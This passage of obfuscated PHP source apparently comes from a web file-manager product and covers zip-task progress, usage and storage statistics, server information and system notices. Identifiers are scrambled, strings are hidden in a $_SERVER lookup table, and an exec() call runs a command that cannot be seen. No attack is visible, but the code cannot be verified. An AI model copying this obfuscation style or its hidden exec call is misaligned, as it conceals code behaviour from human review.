$áÅüñÚ[$¼ÍèàĞ[84]], $¼ÍèàĞ[547] => $áÅüñÚ[$¼ÍèàĞ[547]] ? $áÅüñÚ[$¼ÍèàĞ[547]] : $áÅüñÚ[$¼ÍèàĞ[84]]); if ($áÅüñÚ[$¼ÍèàĞ[33]] == $¼ÍèàĞ[210]) { $·è¼Šè®[$¼ÍèàĞ[818]] = 1; } else { $·è¼Šè®[$¼ÍèàĞ[818]] = $áÅüñÚ[$¼ÍèàĞ[79]][$¼ÍèàĞ[77]]; } $·è¼Šè®[$¼ÍèàĞ[1093]] = $¼ÍèàĞ[12]; $·è¼Šè®[$¼ÍèàĞ[1726]] = 0; $·è¼Šè®[$¼ÍèàĞ[1672]] = 0; $·è¼Šè®[$¼ÍèàĞ[1724]] = 0; $·è¼Šè®[$¼ÍèàĞ[1725]] = 0; $·è¼Šè®[$¼ÍèàĞ[1722]] = $¼ÍèàĞ[12]; $·è¼Šè®[$¼ÍèàĞ[1729]] = 0; $·è¼Šè®[$¼ÍèàĞ[795]] = $áÅüñÚ[$¼ÍèàĞ[76]]; $this->update(); self::log($¼ÍèàĞ[1787] . json_encode(array($·è¼Šè®, $áÅüñÚ))); } public function nameParse($¶¿ºà¿ú) { $ñ„‰ê =& $_SERVER[”ú…±Ú¥]; $­÷‘ğœâ =& $this->task; if ($­÷‘ğœâ[$ñ„‰ê[1785]] == $ñ„‰ê[1223]) { $­÷‘ğœâ[$ñ„‰ê[1785]] = $ñ„‰ê[351]; $­÷‘ğœâ[$ñ„‰ê[1729]] = 0; $­÷‘ğœâ[$ñ„‰ê[795]] = 0; } $Ì¨íëğ³ = get_path_this($¶¿ºà¿ú); if (strstr($Ì¨íëğ³, $ñ„‰ê[10])) { $­÷‘ğœâ[$ñ„‰ê[1672]] += 1; $­÷‘ğœâ[$ñ„‰ê[818]] += 1; } $­÷‘ğœâ[$ñ„‰ê[1722]] = $¶¿ºà¿ú; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $À¢âÔÕÏ =& $_SERVER[”ú…±Ú¥]; parent::startAfter(); Hook::bind($À¢âÔÕÏ[1788], array($this, $À¢âÔÕÏ[1783])); $¥ìÃçÓÂ =& $this->task; $¥ìÃçÓÂ[$À¢âÔÕÏ[1785]] = $À¢âÔÕÏ[1223]; if (!$¥ìÃçÓÂ[$À¢âÔÕÏ[1571]]) { $¥ìÃçÓÂ[$À¢âÔÕÏ[1571]] = LNG($À¢âÔÕÏ[1789]); } } protected function endAfter() { $¾ŠîÓã =& $_SERVER[”ú…±Ú¥]; parent::endAfter(); Hook::unbind($¾ŠîÓã[1788], array($this, $¾ŠîÓã[1783])); } public function updateAfter() { $ÜªŸ·‹ =& $_SERVER[”ú…±Ú¥]; $ìÚ£³¥ =& $this->task; if (!$ìÚ£³¥[$ÜªŸ·‹[818]] || !$ìÚ£³¥[$ÜªŸ·‹[795]]) { return; } if ($ìÚ£³¥[$ÜªŸ·‹[1785]] == $ÜªŸ·‹[1223]) { $ŒªõÒ§¢ = $ìÚ£³¥[$ÜªŸ·‹[1725]]; if ($ìÚ£³¥[$ÜªŸ·‹[1726]] != $ÜªŸ·‹[1223]) { $ŒªõÒ§¢ = 0; } $¯Î’ÁÎÆ = ($ìÚ£³¥[$ÜªŸ·‹[1729]] + $ŒªõÒ§¢) / $ìÚ£³¥[$ÜªŸ·‹[795]]; $ìÚ£³¥[$ÜªŸ·‹[1673]] = $¯Î’ÁÎÆ * 0.3; } else { if ($ìÚ£³¥[$ÜªŸ·‹[1785]] == $ÜªŸ·‹[351]) { $¯Î’ÁÎÆ = $ìÚ£³¥[$ÜªŸ·‹[1672]] / $ìÚ£³¥[$ÜªŸ·‹[818]]; $ìÚ£³¥[$ÜªŸ·‹[1673]] = 0.3 + $¯Î’ÁÎÆ * 0.5; } else { if ($ìÚ£³¥[$ÜªŸ·‹[1785]] == $ÜªŸ·‹[107]) { $¯Î’ÁÎÆ = 0; if ($ìÚ£³¥[$ÜªŸ·‹[1724]]) { $¯Î’ÁÎÆ = $ìÚ£³¥[$ÜªŸ·‹[1725]] / $ìÚ£³¥[$ÜªŸ·‹[1724]]; } $ìÚ£³¥[$ÜªŸ·‹[1673]] = 0.3 + 0.5 + $¯Î’ÁÎÆ * 0.2; } } } if ($ìÚ£³¥[$ÜªŸ·‹[1673]] > 0) { $‚Ç‘’º = timeFloat() - $ìÚ£³¥[$ÜªŸ·‹[1675]] - $ìÚ£³¥[$ÜªŸ·‹[1678]]; $ìÚ£³¥[$ÜªŸ·‹[1679]] = $‚Ç‘’º * (1 - $ìÚ£³¥[$ÜªŸ·‹[1673]]) / $ìÚ£³¥[$ÜªŸ·‹[1673]]; } } public function copyFileStart($†–Ñ¦Ä…, $„‚®¥Îğ, $ôÏëÕœ±, $„¾Ò÷, $½Ôê³Òğ, $›ğ‰­º) { $’Í¿•¯ =& $_SERVER[”ú…±Ú¥]; parent::copyFileStart($†–Ñ¦Ä…, $„‚®¥Îğ, $ôÏëÕœ±, $„¾Ò÷, $½Ôê³Òğ, $›ğ‰­º); $Úøì‹Ì« =& $this->task; if ($Úøì‹Ì«[$’Í¿•¯[1785]] == $’Í¿•¯[351]) { $Úøì‹Ì«[$’Í¿•¯[1785]] = $’Í¿•¯[107]; } $this->update(); } public function copyFileEnd($ë§®Îèâ, $ûí“Ï¯ç, $°À»¥³, $òÄê¦ùª, $Èâ¾§èÃ, $—ÜÙÚÀÃ) { $öÜ€øò =& $_SERVER[”ú…±Ú¥]; $ùï‚ŒÃ =& $this->task; $ùï‚ŒÃ[$öÜ€øò[1725]] = $ùï‚ŒÃ[$öÜ€øò[1724]]; $ùï‚ŒÃ[$öÜ€øò[1729]] += $ùï‚ŒÃ[$öÜ€øò[1724]]; $ùï‚ŒÃ[$öÜ€øò[1726]] = $öÜ€øò[12]; $this->update(); } public function nameParse($­ôü¬ß) { $û´²‘ØÉ =& $_SERVER[”ú…±Ú¥]; $Úµ£ÚÚ =& $this->task; if ($Úµ£ÚÚ[$û´²‘ØÉ[1672]] < $Úµ£ÚÚ[$û´²‘ØÉ[818]]) { $Õá€ÒŠ = get_path_this($­ôü¬ß); if (strstr($Õá€ÒŠ, $û´²‘ØÉ[10])) { $Úµ£ÚÚ[$û´²‘ØÉ[1672]] += 1; } } if ($Úµ£ÚÚ[$û´²‘ØÉ[1785]] == $û´²‘ØÉ[1223]) { $Úµ£ÚÚ[$û´²‘ØÉ[1785]] = $û´²‘ØÉ[351]; } $Úµ£ÚÚ[$û´²‘ØÉ[1722]] = $­ôü¬ß; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($ÄÆ¹î˜Ê) { $ê‰õÖ‚÷ =& $_SERVER[”ú…±Ú¥]; $Î²‘¯€‘ = array($ê‰õÖ‚÷[628] => array($ê‰õÖ‚÷[33] => $ê‰õÖ‚÷[1790], $ê‰õÖ‚÷[311] => array($ê‰õÖ‚÷[234], $ê‰õÖ‚÷[797], $ê‰õÖ‚÷[1791], $ê‰õÖ‚÷[1792])), $ê‰õÖ‚÷[1793] => array($ê‰õÖ‚÷[33] => $ê‰õÖ‚÷[1794], $ê‰õÖ‚÷[311] => array($ê‰õÖ‚÷[234], $ê‰õÖ‚÷[795], $ê‰õÖ‚÷[1795], $ê‰õÖ‚÷[1796], $ê‰õÖ‚÷[1797]))); if (!isset($Î²‘¯€‘[$ÄÆ¹î˜Ê])) { return !1; } $this->optionType = $Î²‘¯€‘[$ÄÆ¹î˜Ê][$ê‰õÖ‚÷[33]]; $this->field = $Î²‘¯€‘[$ÄÆ¹î˜Ê][$ê‰õÖ‚÷[311]]; return !0; } public function listData($’Ÿ÷•á” = false, $Ïáå¦ó = "\x6d\157\144\x69\x66\171\124\151\155\x65", $ÄÛğ·äá = false) { return parent::listData($’Ÿ÷•á”, $Ïáå¦ó, $ÄÛğ·äá); } public function trendList($ŒÎşı¼) { $ŒÖğ§Áø =& $_SERVER[”ú…±Ú¥]; $×¤ãü = $this->listData(); if ($×¤ãü) { $¢óßùİà = end($×¤ãü); $ëó÷äî° = date($ŒÖğ§Áø[1798], strtotime($ŒÖğ§Áø[1799])); if ($¢óßùİà[$ŒÖğ§Áø[234]] == $ëó÷äî°) { return $×¤ãü; } $ß÷÷Ó¸Š = strtotime($¢óßùİà[$ŒÖğ§Áø[234]]); } if (!isset($ß÷÷Ó¸Š)) { $¹‰ÑõÑÌ = $ŒÎşı¼ == $ŒÖğ§Áø[628] ? $ŒÖğ§Áø[563] : $ŒÖğ§Áø[857]; $ß÷÷Ó¸Š = Model($¹‰ÑõÑÌ)->min($ŒÖğ§Áø[211]); } $À‡¼”£ú = $ŒÖğ§Áø[1800] . ucfirst($ŒÎşı¼); $Áˆ‰ú£´ = $this->dateList($ß÷÷Ó¸Š); foreach ($Áˆ‰ú£´ as $ëó÷äî°) { $this->{$À‡¼”£ú}($ëó÷äî°); } return $this->listData(); } private function dateList($Ó„ÁíÒ«) { $¿š¡š¡ =& $_SERVER[”ú…±Ú¥]; $ä¥ÔŠÛÍ = $Ó„ÁíÒ«; $ºš×ª¿ = strtotime($¿š¡š¡[1799]); $Ç•‡ÄÎ— = array(); while ($ä¥ÔŠÛÍ <= $ºš×ª¿) { $Ç•‡ÄÎ—[] = date($¿š¡š¡[1798], $ä¥ÔŠÛÍ); $ä¥ÔŠÛÍ = strtotime($¿š¡š¡[1801], $ä¥ÔŠÛÍ); } return $Ç•‡ÄÎ—; } public function _recordUser($ˆÇøğÖõ = '') { $èàªåøÄ =& $_SERVER[”ú…±Ú¥]; $ú§ø“¥§ = strtotime(date($èàªåøÄ[1802], strtotime($ˆÇøğÖõ))); $Áûë£Ÿó = strtotime(date($èàªåøÄ[1803], strtotime($ˆÇøğÖõ))); $«üêÒÆì = array($èàªåøÄ[211] => array($èàªåøÄ[1042], $Áûë£Ÿó)); $½á…ºÙ² = Model($èàªåøÄ[563])->where($«üêÒÆì)->count($èàªåøÄ[1671]); $«üêÒÆì[$èàªåøÄ[211]] = array($èàªåøÄ[371], array($ú§ø“¥§, $Áûë£Ÿó)); $šÛ‚ø§Ì = Model($èàªåøÄ[563])->where($«üêÒÆì)->count($èàªåøÄ[1671]); $«üêÒÆì[$èàªåøÄ[33]] = $èàªåøÄ[1804]; $Íè†ø•î = Model($èàªåøÄ[1805])->where($«üêÒÆì)->count($èàªåøÄ[1806]); $Ó‘âÓ¶” = array($èàªåøÄ[234] => $ˆÇøğÖõ, $èàªåøÄ[797] => (int) $½á…ºÙ², $èàªåøÄ[1791] => (int) $šÛ‚ø§Ì, $èàªåøÄ[1792] => (int) $Íè†ø•î); return $this->insert($Ó‘âÓ¶”); } public function _recordStore($åŞÙ­†š = '') { $Šú³¦ˆ =& $_SERVER[”ú…±Ú¥]; $­ùˆµ™ì = strtotime(date($Šú³¦ˆ[1803], strtotime($åŞÙ­†š))); $óÈ»Œ¾± = array($Šú³¦ˆ[211] => array($Šú³¦ˆ[1042], $­ùˆµ™ì)); $ØÄ¯³í = Model($Šú³¦ˆ[509])->where($óÈ»Œ¾±)->sum($Šú³¦ˆ[76]); $óÈ»Œ¾±[$Šú³¦ˆ[448]] = 0; $ÚŸ‰»Èº = Model($Šú³¦ˆ[857])->where($óÈ»Œ¾±)->sum($Šú³¦ˆ[76]); $óÈ»Œ¾±[$Šú³¦ˆ[449]] = 1; $½Õ¯Ñºš = Model($Šú³¦ˆ[857])->where($óÈ»Œ¾±)->sum($Šú³¦ˆ[76]); $óÈ»Œ¾±[$Šú³¦ˆ[449]] = 2; $ï•ıá»Ã = Model($Šú³¦ˆ[857])->where($óÈ»Œ¾±)->sum($Šú³¦ˆ[76]); $’·ã†¸… = array($Šú³¦ˆ[234] => $åŞÙ­†š, $Šú³¦ˆ[795] => (int) $ÚŸ‰»Èº, $Šú³¦ˆ[1795] => (int) $ØÄ¯³í, $Šú³¦ˆ[1796] => (int) $½Õ¯Ñºš, $Šú³¦ˆ[1797] => (int) $ï•ıá»Ã); return $this->insert($’·ã†¸…); } public function trend($ÄèËä, $­ğĞ°ìõ) { $ÊíåöË• =& $_SERVER[”ú…±Ú¥]; if (!$this->init($ÄèËä)) { return !1; } $‡Ä¼âë = $this->trendList($ÄèËä); if ($‡Ä¼âë && $­ğĞ°ìõ != $ÊíåöË•[1644]) { $‰ãÖ¯å = $‡Ä¼âë[0][$ÊíåöË•[234]]; $…Á„ê’Œ = $this->validDate($­ğĞ°ìõ, $‰ãÖ¯å); $¯¢£—’Å = array(); $Ô¢ÉÍôè = array_to_keyvalue($‡Ä¼âë, $ÊíåöË•[234]); foreach ($…Á„ê’Œ as $îğµœäˆ) { if (isset($Ô¢ÉÍôè[$îğµœäˆ])) { $Ï©ôøØ÷ = $Ô¢ÉÍôè[$îğµœäˆ]; } else { $Ï©ôøØ÷ = end($‡Ä¼âë); $Ï©ôøØ÷[$ÊíåöË•[234]] = $îğµœäˆ; if ($ÄèËä == $ÊíåöË•[628]) { $Ï©ôøØ÷[$ÊíåöË•[1791]] = $Ï©ôøØ÷[$ÊíåöË•[1792]] = 0; } } $¯¢£—’Å[] = $Ï©ôøØ÷; } $‡Ä¼âë = $¯¢£—’Å; } $±‚èËÙ = array($ÊíåöË•[628] => array($ÊíåöË•[797] => LNG($ÊíåöË•[1807]), $ÊíåöË•[1791] => LNG($ÊíåöË•[1808]), $ÊíåöË•[1792] => LNG($ÊíåöË•[1809])), $ÊíåöË•[1793] => array($ÊíåöË•[795] => LNG($ÊíåöË•[1810]), $ÊíåöË•[1795] => LNG($ÊíåöË•[1811]), $ÊíåöË•[1796] => LNG($ÊíåöË•[1812]), $ÊíåöË•[1797] => LNG($ÊíåöË•[1813]))); $¯®ÃóÌ’ = array($ÊíåöË•[628] => $ÊíåöË•[1814], $ÊíåöË•[1793] => $ÊíåöË•[76]); if (empty($‡Ä¼âë)) { $îğµœäˆ = date($ÊíåöË•[1798], strtotime($ÊíåöË•[1799])); $ÂÜ€ÒËÀ = array($ÊíåöË•[234] => $îğµœäˆ); foreach ($±‚èËÙ[$ÄèËä] as $ğŸ®¤¤ => $‰¬·º“€) { $ÂÜ€ÒËÀ[$ğŸ®¤¤] = 0; } $‡Ä¼âë[] = $ÂÜ€ÒËÀ; } $¦¢šî– = array(); foreach ($‡Ä¼âë as $‰¬·º“€) { if ($ÄèËä == $ÊíåöË•[1793] && $‰¬·º“€[$ÊíåöË•[1795]] > $‰¬·º“€[$ÊíåöË•[795]]) { $‰¬·º“€[$ÊíåöË•[1795]] = $‰¬·º“€[$ÊíåöË•[795]]; } foreach ($±‚èËÙ[$ÄèËä] as $ğŸ®¤¤ => $Óä¾íÛ¹) { $Ï©ôøØ÷ = array($ÊíåöË•[234] => $‰¬·º“€[$ÊíåöË•[234]], $ÊíåöË•[1571] => $Óä¾íÛ¹); $Ï©ôøØ÷[$¯®ÃóÌ’[$ÄèËä]] = isset($‰¬·º“€[$ğŸ®¤¤]) ? $‰¬·º“€[$ğŸ®¤¤] : 0; $¦¢šî–[] = $Ï©ôøØ÷; } } return $¦¢šî–; } public function validDate($²ÑÖ™ßÖ, $Ğ‡äßéä) { $Œ¼ÓÑŒò =& $_SERVER[”ú…±Ú¥]; $ˆ¯ÇÚ­× = date($Œ¼ÓÑŒò[1798], strtotime($Œ¼ÓÑŒò[1799])); $ˆ³·òº = array($ˆ¯ÇÚ­×); switch ($²ÑÖ™ßÖ) { case $Œ¼ÓÑŒò[1651]: $”şŸß = mktime(0, 0, 0, date($Œ¼ÓÑŒò[1815]), date($Œ¼ÓÑŒò[1390]) - date($Œ¼ÓÑŒò[1453]) + 7 - 7, date($Œ¼ÓÑŒò[1816])); $Ò‘úôìº = 0; do { $§öÚÛ¨Ú = date($Œ¼ÓÑŒò[1798], $”şŸß - 3600 * 24 * 7 * $Ò‘úôìº); $ˆ³·òº[] = $§öÚÛ¨Ú; $Ò‘úôìº++; } while ($Ğ‡äßéä < $§öÚÛ¨Ú); break; case $Œ¼ÓÑŒò[1649]: $Ò‘úôìº = 1; do { $Áˆ¶œŒŸ = date($Œ¼ÓÑŒò[1817], strtotime("\x2d\x20{$Ò‘úôìº}\40\155\157\x6e\x74\150\x73")); $ˆ³·òº[] = $Áˆ¶œŒŸ; $Ò‘úôìº++; } while ($Ğ‡äßéä < $Áˆ¶œŒŸ); break; case $Œ¼ÓÑŒò[1818]: $¦¹™á = (int) date($Œ¼ÓÑŒò[1816], strtotime($Ğ‡äßéä)); $Ç‚Îì…ï = (int) date($Œ¼ÓÑŒò[1816]); if ($¦¹™á >= $Ç‚Îì…ï) { break; } for ($¦¹™á; $¦¹™á < $Ç‚Îì…ï; $¦¹™á++) { $ˆ³·òº[] = $¦¹™á . $Œ¼ÓÑŒò[1819]; } break; default: break; } if ($Ğ‡äßéä > end($ˆ³·òº)) { array_pop($ˆ³·òº); } sort($ˆ³·òº); return $ˆ³·òº; } public function listTable($¹¦‰Ë£®) { $Â›¿×Òó = ucfirst($¹¦‰Ë£®); return Model($Â›¿×Òó)->listData(); } public function option($Ú¥Ìƒæ») { $ƒÜÁİ•á = $_SERVER[”ú…±Ú¥][1820] . ucfirst($Ú¥Ìƒæ»); return $this->{$ƒÜÁİ•á}(); } private function optionUser() { $»§·Š°ı =& $_SERVER[”ú…±Ú¥]; $™Ú¶˜  = Model($»§·Š°ı[563])->count($»§·Š°ı[1671]); $ÉÆ¥Êİ = Model($»§·Š°ı[563])->where($»§·Š°ı[1821])->count($»§·Š°ı[1671]); $îÆ†ø²µ = intval($GLOBALS[$»§·Š°ı[6]][$»§·Š°ı[387]][$»§·Š°ı[1626]]) / 3600; $¨³Í·ƒ¥ = strtotime("\55{$îÆ†ø²µ}\40\x68\157\x75\162\x73"); $Í¿ì¯ƒ÷ = strtotime(date($»§·Š°ı[1802])); if ($¨³Í·ƒ¥ < $Í¿ì¯ƒ÷) { $¨³Í·ƒ¥ = $Í¿ì¯ƒ÷; } $‡é°¢± = array($»§·Š°ı[1822] => array($»§·Š°ı[1043], $¨³Í·ƒ¥)); $µ½¥Èü‘ = (int) Model($»§·Š°ı[563])->where($‡é°¢±)->count($»§·Š°ı[1671]); if (!$µ½¥Èü‘) { $µ½¥Èü‘ = 1; } $‡é°¢± = array($»§·Š°ı[1822] => array($»§·Š°ı[1043], $Í¿ì¯ƒ÷)); $Š›öáªÊ = Model($»§·Š°ı[563])->where($‡é°¢±)->count($»§·Š°ı[1671]); return array($»§·Š°ı[790] => (int) $™Ú¶˜ , $»§·Š°ı[1823] => (int) ($™Ú¶˜  - $ÉÆ¥Êİ), $»§·Š°ı[1824] => (int) $ÉÆ¥Êİ, $»§·Š°ı[1825] => (int) $Š›öáªÊ, $»§·Š°ı[1826] => $µ½¥Èü‘); } private function optionFile() { $ÛÍˆˆ¢© =& $_SERVER[”ú…±Ú¥]; $ô…õ¡ô¸ = $this->sourceSize(); $¬ÌŸÜÙ– = $ô…õ¡ô¸[$ÛÍˆˆ¢©[76]]; $Ü³ÀïÏô = $ô…õ¡ô¸[$ÛÍˆˆ¢©[1795]]; $ñ£€Ç¹± = Model($ÛÍˆˆ¢©[857])->where(array($ÛÍˆˆ¢©[448] => 0))->count($ÛÍˆˆ¢©[440]); $Ò±Ô» = array($ÛÍˆˆ¢©[448] => 0, $ÛÍˆˆ¢©[211] => array($ÛÍˆˆ¢©[1043], strtotime(date($ÛÍˆˆ¢©[1802])))); $²ÀÊøƒ = Model($ÛÍˆˆ¢©[857])->where($Ò±Ô»)->sum($ÛÍˆˆ¢©[76]); $ôÊ”åú = Model($ÛÍˆˆ¢©[857])->where($Ò±Ô»)->count($ÛÍˆˆ¢©[440]); return array($ÛÍˆˆ¢©[795] => $¬ÌŸÜÙ–, $ÛÍˆˆ¢©[1795] => $Ü³ÀïÏô, $ÛÍˆˆ¢©[1827] => $¬ÌŸÜÙ– - $Ü³ÀïÏô, $ÛÍˆˆ¢©[1828] => (int) $²ÀÊøƒ, $ÛÍˆˆ¢©[797] => (int) $ñ£€Ç¹±, $ÛÍˆˆ¢©[1829] => (int) $ôÊ”åú); } private function optionAccess() { $‰Í‚»Õù =& $_SERVER[”ú…±Ú¥]; return array($‰Í‚»Õù[790] => $this->typeLogCnt(), $‰Í‚»Õù[107] => $this->typeLogCnt($‰Í‚»Õù[107]), $‰Í‚»Õù[490] => $this->typeLogCnt($‰Í‚»Õù[490]), $‰Í‚»Õù[1830] => $this->typeLogCnt($‰Í‚»Õù[1830]), $‰Í‚»Õù[1831] => $this->typeLogCnt($‰Í‚»Õù[1831]), $‰Í‚»Õù[628] => $this->typeLogCnt($‰Í‚»Õù[12], $‰Í‚»Õù[1806])); } private function typeLogCnt($İñÁ°¡ = '', $Ÿ¡‡Õ¼í = "\151\144") { $ßƒçÌœ =& $_SERVER[”ú…±Ú¥]; $ÎèÁ­õ = array($ßƒçÌœ[107] => array($ßƒçÌœ[1832], $ßƒçÌœ[1833]), $ßƒçÌœ[490] => array($ßƒçÌœ[1834], $ßƒçÌœ[1835]), $ßƒçÌœ[1830] => array($ßƒçÌœ[1836], $ßƒçÌœ[1837], $ßƒçÌœ[1838]), $ßƒçÌœ[1831] => array($ßƒçÌœ[1839], $ßƒçÌœ[1840]), $ßƒçÌœ[1841] => array($ßƒçÌœ[1842], $ßƒçÌœ[1843], $ßƒçÌœ[1844])); $Ô×Çú· = strtotime(date($ßƒçÌœ[1802])); $ï«®ª Å = array($ßƒçÌœ[211] => array($ßƒçÌœ[1043], $Ô×Çú·)); if ($İñÁ°¡) { $ï«®ª Å[$ßƒçÌœ[33]] = array($ßƒçÌœ[7], $ÎèÁ­õ[$İñÁ°¡]); } $Šû³€İÊ = Model($ßƒçÌœ[1805])->where($ï«®ª Å)->count($Ÿ¡‡Õ¼í); return (int) $Šû³€İÊ; } private function optionServer() { $»˜ÅâÁÆ =& $_SERVER[”ú…±Ú¥]; $æŒˆ—Š– = $this->diskDriver(); $ôÑ³È¥ = KodIO::defaultDriver(); $ıíúâ™é = array($»˜ÅâÁÆ[849] => $ôÑ³È¥[$»˜ÅâÁÆ[437]]); $ÙÑÒßÅ‘ = Model($»˜ÅâÁÆ[509])->where($ıíúâ™é)->sum($»˜ÅâÁÆ[76]); $şŒåÙ‘Î = explode($»˜ÅâÁÆ[53], $_SERVER[$»˜ÅâÁÆ[143]]); $âµÇ™ƒ = $şŒåÙ‘Î[0]; $üæÂíƒ¾ = $GLOBALS[$»˜ÅâÁÆ[6]][$»˜ÅâÁÆ[21]]; $û­Ë×ª = $üæÂíƒ¾[$»˜ÅâÁÆ[1005]]; if ($û­Ë×ª == $»˜ÅâÁÆ[993]) { $¶åöÛ¤– = explode($»˜ÅâÁÆ[1311], $üæÂíƒ¾[$»˜ÅâÁÆ[1004]]); $û­Ë×ª = $¶åöÛ¤–[0]; } if ($û­Ë×ª == $»˜ÅâÁÆ[941] || $û­Ë×ª == $»˜ÅâÁÆ[836]) { $¢Â¦¬ã• = Model()->db()->query($»˜ÅâÁÆ[1845]); $·Ôæ¥“¥ = $¢Â¦¬ã•[0] && isset($¢Â¦¬ã•[0][$»˜ÅâÁÆ[1570]]) ? $¢Â¦¬ã•[0][$»˜ÅâÁÆ[1570]] : 0; $û­Ë×ª = $»˜ÅâÁÆ[1846] . ($·Ôæ¥“¥ ? $»˜ÅâÁÆ[8] . $·Ôæ¥“¥ : $»˜ÅâÁÆ[12]); } $“âõ•ÊŒ = $GLOBALS[$»˜ÅâÁÆ[6]][$»˜ÅâÁÆ[387]][$»˜ÅâÁÆ[859]]; return array($»˜ÅâÁÆ[1847] => $æŒˆ—Š– ? $æŒˆ—Š–[$»˜ÅâÁÆ[1848]] : 0, $»˜ÅâÁÆ[1849] => $æŒˆ—Š– ? $æŒˆ—Š–[$»˜ÅâÁÆ[1850]] : 0, $»˜ÅâÁÆ[1851] => (int) $ôÑ³È¥[$»˜ÅâÁÆ[1848]] * 1024 * 1024 * 1024, $»˜ÅâÁÆ[1852] => (int) $ÙÑÒßÅ‘, $»˜ÅâÁÆ[1853] => ucfirst($âµÇ™ƒ), $»˜ÅâÁÆ[1854] => $»˜ÅâÁÆ[1855] . PHP_VERSION, $»˜ÅâÁÆ[1856] => phpBuild64() ? 64 : 32, $»˜ÅâÁÆ[789] => str_replace($»˜ÅâÁÆ[1159], $»˜ÅâÁÆ[1021], $û­Ë×ª), $»˜ÅâÁÆ[387] => ucfirst($“âõ•ÊŒ), $»˜ÅâÁÆ[32] => $_SERVER[$»˜ÅâÁÆ[1857]]); } private function diskDriver() { $ÓŒÑÍß¼ =& $_SERVER[”ú…±Ú¥]; $™ÉûšéÕ = $ÓŒÑÍß¼[8]; $ˆÔÃÚüë = $GLOBALS[$ÓŒÑÍß¼[6]][$ÓŒÑÍß¼[1328]] == $ÓŒÑÍß¼[1329]; if ($ˆÔÃÚüë) { $™ÉûšéÕ = $ÓŒÑÍß¼[1858]; if (function_exists($ÓŒÑÍß¼[1859])) { exec($ÓŒÑÍß¼[1860], $Á¶æ«ë); $™ÉûšéÕ = $Á¶æ«ë[1] . $ÓŒÑÍß¼[8]; } } if (!file_exists($™ÉûšéÕ)) { return; } $Ñ•üàÃ× = @disk_total_space($™ÉûšéÕ); $Ú˜„áà  = $Ñ•üàÃ× - @disk_free_space($™ÉûšéÕ); return array($ÓŒÑÍß¼[1848] => $Ñ•üàÃ×, $ÓŒÑÍß¼[1850] => $Ú˜„áà ); } public function fileChart($çİØçĞ) { $òæÃõş =& $_SERVER[”ú…±Ú¥]; if (isset($çİØçĞ[$òæÃõş[1671]])) { return Model($òæÃõş[857])->userFileTypeProfile($çİØçĞ[$òæÃõş[1671]]); } if (isset($çİØçĞ[$òæÃõş[1861]])) { return Model($òæÃõş[857])->groupFileTypeProfile($çİØçĞ[$òæÃõş[1861]]); } $ˆì•²µ = $this->sourceSize(); $ÃÖ»°¬ = array($òæÃõş[470] => 0, $òæÃõş[449] => 1); $œ„­Óà¾ = Model($òæÃõş[857])->where($ÃÖ»°¬)->sum($òæÃõş[76]); $ÃÖ»°¬[$òæÃõş[449]] = 2; $Ğß¨©şÂ = Model($òæÃõş[857])->where($ÃÖ»°¬)->sum($òæÃõş[76]); return array($òæÃõş[795] => $ˆì•²µ[$òæÃõş[76]], $òæÃõş[1795] => $ˆì•²µ[$òæÃõş[1795]], $òæÃõş[1796] => (int) $œ„­Óà¾, $òæÃõş[1797] => (int) $Ğß¨©şÂ); } private function sourceSize() { $‡¶ôµæÕ =& $_SERVER[”ú…±Ú¥]; $­­Äî€¯ = Model($‡¶ôµæÕ[857])->where(array($‡¶ôµæÕ[448] => 0))->sum($‡¶ôµæÕ[76]); $ÉËöáéÀ = Model($‡¶ôµæÕ[509])->sum($‡¶ôµæÕ[76]); if ($ÉËöáéÀ > $­­Äî€¯) { $ÉËöáéÀ = $­­Äî€¯; } return array($‡¶ôµæÕ[76] => (int) $­­Äî€¯, $‡¶ôµæÕ[1795] => (int) $ÉËöáéÀ); } } goto Cõé‡‚™; eáÆ·”¥éì: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\155\x2e\156\157\x74\x69\x63\145\114\151\x73\x74"; public $field = array("\x6e\x61\x6d\145", "\x63\x6f\156\x74\145\156\x74", "\141\165\x74\150", "\x6d\157\144\145", "\164\151\155\x65", "\164\x79\x70\145", "\154\x65\x76\145\154", "\145\156\141\142\154\145", "\x73\157\x72\164"); public function listData($”Ø±û—° = false, $ÒÂ¸Š = "\x73\x6f\162\x74", $áêœ°Üã = false) { return parent::listData($”Ø±û—°, $ÒÂ¸Š, $áêœ°Üã); } public function add($öéŒ¸»…) { $Ú¥¨‚–ª =& $_SERVER[”ú…±Ú¥]; $ÈÊ«ò¼ì = time(); if ($öéŒ¸»…[$Ú¥¨‚–ª[16]] == $Ú¥¨‚–ª[2292]) { $ÈÊ«ò¼ì = strtotime($öéŒ¸»…[$Ú¥¨‚–ª[180]]); } $öéŒ¸»…[$Ú¥¨‚–ª[180]] = $ÈÊ«ò¼ì; return parent::insert($öéŒ¸»…); } public function update($ŒÚõşÆ, $ú”Ë’‡õ) { $¶Ü¹¥ë¯ =& $_SERVER[”ú…±Ú¥]; $’Ò±š‚ = $this->listData($ŒÚõşÆ); if (!$’Ò±š‚) { return !1; } $÷ïó¢¬ = time(); if ($ú”Ë’‡õ[$¶Ü¹¥ë¯[16]] == $¶Ü¹¥ë¯[2292]) { $÷ïó¢¬ = strtotime($ú”Ë’‡õ[$¶Ü¹¥ë¯[180]]); } $ú”Ë’‡õ[$¶Ü¹¥ë¯[180]] = $÷ïó¢¬; return parent::update($ŒÚõşÆ, $ú”Ë’‡õ); } public function remove($¤™ñÒ­é) { $Ë‚´§õ = $this->listData($¤™ñÒ­é); if (!$Ë‚´§õ || $Ë‚´§õ[$_SERVER[”ú…±Ú¥][1316]]) { return !1; } return parent::remove($¤™ñÒ­é); } public function sort($Àäºö¯, $™‘¨öŞ“) { return parent::update($Àäºö¯, $™‘¨öŞ“); } public function enable($™ÌèÆ­…, $£¤é‡İ®) { return parent::update($™ÌèÆ­…, array($_SERVER[”ú…±Ú¥][2293] => $£¤é‡İ®)); } private function initUserOption() { $¥Ä…‡•Ø =& $_SERVER[”ú…±Ú¥]; $this->optionType = $¥Ä…‡•Ø[2294]; $this->modelType = $¥Ä…‡•Ø[2295]; $this->field = array($¥Ä…‡•Ø[2296], $¥Ä…‡•Ø[32], $¥Ä…‡•Ø[180], $¥Ä…‡•Ø[33], $¥Ä…‡•Ø[2297], $¥Ä…‡•Ø[782], $¥Ä…‡•Ø[206]); } public function userNoticeGet($³ÂÃÍøæ = false) { $this->initUserOption(); return parent::listData($³ÂÃÍøæ, $_SERVER[”ú…±Ú¥][437], !0); } public function 